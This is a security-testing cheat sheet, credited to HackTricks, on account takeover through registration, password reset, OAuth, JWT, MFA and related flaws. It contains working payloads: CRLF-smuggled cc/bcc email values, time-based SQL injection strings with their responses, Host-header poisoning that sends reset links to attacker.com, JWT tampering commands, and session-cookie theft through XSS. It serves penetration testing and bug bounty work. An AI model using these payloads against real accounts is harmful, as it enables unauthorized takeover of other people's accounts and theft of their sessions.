---
description: '( Credits: HackTricks )'
---

# Registration & Takeover Bugs

#### **ATO from manipulating the email Parameter**

```python
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
#No domain:
email=victim
#No TLD (Top Level Domain):
email=victim@xyz
#change param case 
email=victim@mail.com&Email=attacker@mail.com
email@email.com**,**victim@hack.secry  
email@email**“,”**victim@hack.secry  
email@email.com**:**victim@hack.secry  
email@email.com**%0d%0a**victim@hack.secry  
**%0d%0a**victim@hack.secry  
**%0a**victim@hack.secry  
victim@hack.secry**%0d%0a**  
victim@hack.secry**%0a**  
victim@hack.secry**%0d** 
victim@hack.secry**%00**  
victim@hack.secry**{{}}**
```

#### ATO Via Request Smuggling

```python
# Single Host: 
python3 smuggler.py -u <URL> 
# List of hosts: 
cat list_of_hosts.txt | python3 smuggler.py
```

[HTTP Request Smuggling leads to Full Accounts takeover](https://itsfading.github.io/posts/I-owe-your-Request-HTTP-Request-Smuggling-leads-to-Full-Accounts-takeover/)

#### Duplicate Registration

1. Make 2 Accounts Same in everything \[username and another things] but with Different email ID >> **ATO**
   * [Duplicate Registration - The Twinning Twins | by Jerry Shah (Jerry) | Medium](https://shahjerry33.medium.com/duplicate-registration-the-twinning-twins-883dfee59eaf)
   * Create user named: **AdMIn** (uppercase & lowercase letters)
   * Create a user named: **admin=**
   * **SQL Truncation Attack** (when there is some kind of **length limit** in the username or email) --> Create user with name: **admin \[a lot of spaces] a**
2. Play with email Parameter
   * uppsercase
   * \+1@
   * add some some in the email
   * special characters in the email name (%00, %09, %20)
   * Put black characters after the email: `test@test.com a`
   * victim@gmail.com@attacker.com
   * victim@attacker.com@gmail.com

#### SQL Injection

* In email field

```python
# SQLI in Email Field 
{"email":"asd'a@a.com"} --> Not Valid 
{"email":"asd'or'1'='1@a.com" } --> valid 
{"email":"a'-IF(LENGTH(database())>9,SLEE P(7),0)or'1'='1@a.com"} --> Not Valid 
{"email":"a'-IF(LENGTH(database())>9,SLEE P(7),0)or'1'='1@a.com"} -> Valid --> Delay: 7,854 milis 
{"email":"\\"a'-IF(LENGTH(database())=10,SLEEP(7),0)or'1'='1\\"@a.com"} --> {"code":0,"status":200,"message":"Berhasil"} --> Valid --> Delay 8,696 milis 
{"email":"\\"a"-IF(LENGTH(database())=11,SLEEP(7),0)or'1'='1\\"@a.com"} ---> {"code":0,"status":200,"message":"Berhasil"} ---> Valid --> No delay 
 # Resources 
 https://dimazarno.medium.com/bypassing-email-filter-which-leads-to-sql-injection-e57bcbfc6b17
```

* Insert Statement | Modify password of existing object/user To do so you should try to **create a new object named as the "master object"** (probably **admin** in case of users) modifying something:
  * Create user named: **AdMIn** (uppercase & lowercase letters)
  * Create a user named: **admin=**
  * **SQL Truncation Attack** (when ere is some kind of **length limit** in the username or email) --> Create user with name: **admin \[a lot of spaces] a**

#### OAUTH Takeovers

\[\[OAUTH to ATO]]

* [ ] Test `edirect_uri` for \[\[Open Redirect]] and \[\[Web-App Security/XSS|XSS]]
* [ ] Test the existence of response\_type=token
* [ ] Missing state parameter? -> CSRF
* [ ] Predictable state parameter?
* [ ] Is state parameter being verified?

#### SAML Vulnerabilities

[SAML Attacks - HackTricks](https://book.hacktricks.xyz/pentesting-web/saml-attacks)

### Change email Feature

* [ ] Try to change email to Registered email
* [ ] Try to change email to unregistered email but try to handle Reset Password to Get Pre-ATO

### More Checks

* [ ] Check if you can use **disposable emails**
* [ ] **Long** **password** (>200) leads to **DoS**
* [ ] **Check rate limits on account creation**
* [ ] Use username@**burp\_collab**.net and analyze the **callback**

### **Password Reset Takeover**

**Password Reset Token Leak Via Referrer**

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referrer header is leaking password reset token.

**Password Reset Poisoning**

\[\[Host Header Injection]]

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header `http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

**Weak Password Reset Token**

The password reset token should be randomly generated and unique every time. Try to determine if the token expire or if it’s always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.

```go
- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between [A-Z,a-z,0-9])
- Token reuse
- Token expiration date
```

**Password Reset Via Username Collision**

1. Register on the system with a username identical to the victim’s username, but with white spaces inserted before and/or after the username. e.g: `"admin "`
2. Request a password reset with your malicious username.
3. Use the token sent to your email and reset the victim password.
4. Connect to the victim account with the new password.

### Leaking Sensitive Info in Response

* Steps(For Registration):

```
  1. For registeration intercept the signup request that contains the data you have entered.
  2. Click on action -> do -> intercept the response to this request.
  3. Click forward.
  4. Check response if that contains any link, any token or OTP.
```

***

* Steps (For password reset):

<!---->

* [ ] API endpoints leaks tokens
* [ ] Tokens Leaked in the Response
* [ ] Tokens Leaked in JavaScript File

```
 1. Intercept the forget password option.
 2. Click on action -> do -> intercept the response to this request.
 3. Click forward.
 4. Check response if that contains any link,any token or OTP.
```

### IDOR on API Parameters

1. Attacker have to login with their account and go to the **Change password** feature.
2. Start the Burp Suite and Intercept the request
3. Send it to the repeater tab and edit the parameters : User ID/email `powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### XSS to ATO

\[\[HowToHunt-master/XSS/Xss]]

* Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : `*.domain.com`
* Leak the current **sessions cookie**
* Authenticate as the user using the cookie

### CSRF to ATO

\[\[HowToHunt-master/CSRF/CSRF]]

1. Change Password function.
2. Email change
3. Change Security Question

***

5. Create a payload for the CSRF, e.g: “HTML form with auto submit for a password change”
6. Send the payload

### ATO via JWT

* [ ] Edit the JWT with another User ID / Email
* [ ] Multiple JWT test cases\
  `python3 jwt_tool.py -t https://api.example.com/api/working_endpoint -rh "Content-Type: application/json" -rh "Authorization: Bearer [JWT]" -M at`
* [ ] Test JWT secret brute-forcing `python3 jwt_tool.py <JWT> -C -d <Wordlist>`
* [ ] Abusing JWT Public Keys Without knowing the Public Key `https://github.com/silentsignal/rsa_sign2n`
* [ ] Test if algorithm could be changed
  * Change algorithm to None `python3 jwt_tool.py <JWT> -X a`
  * Change algorithm from RS256 to HS256 `python3 jwt_tool.py <JWT> -S hs256 -k public.pem`
* [ ] Test if signature is being validated `python3 jwt_tool.py <JWT> -I -pc <Key> -pv <Value>`
* [ ] Test token expiration time (TTL, RTTL)
* [ ] Test if sensitive data is in the JWT
* [ ] Check for Injection in "kid" element `python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""`
* [ ] Check for time constant verification for HMAC
* [ ] Check that keys and secrets are different between ENV

### Using MFA/OTP issues

* [ ] Response Manipulation
* [ ] **Enable 2FA without verifying the email**
* [ ] Try IDOR
* [ ] **2FA Code Leakage in Response**
* [ ] **Missing 2FA Code Integrity Validation**
* [ ] **2FA Referrer Check Bypass | Direct Request**
* [ ] Lack of Brute Force protection
* [ ] Race Condition
* [ ] **Disable 2FA via CSRF** \[\[OTP\_Bypass]] [An Interesting Account Takeover Vulnerability | by Avanish Pathak | Medium](https://avanishpathak.medium.com/an-interesting-account-takeover-vulnerability-a1fbec0e01a)
* [ ] Response Manipulation
* [ ] Bypassing OTP in registration forms by repeating the form submission multiple times using repeater
* [ ] No Rate Limit

### Authentication Bypass Via Response Manipulation

\[\[Authentication Bugs]]

```
Check out Auth Bypass method, there is a method for OTP bypass via response manipulation, this can leads to account takeovers.
1.Enter the wrong auth code / Password
2.Capture a auth request in burpsuite and send it to repeater 
3.Check for the resoponse
4.Change the respone by manipulating the following parameters
  {“code”:”invalid_credentials”} -> {“code”:”valid_credentials”}
  {“verify”:”false”}             -> {“verify”:”true”}
```

### SSRF to ATO

https://infosecwriteups.com/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5

### Remote session Fixation to ATO

https://hackerone.com/reports/423136
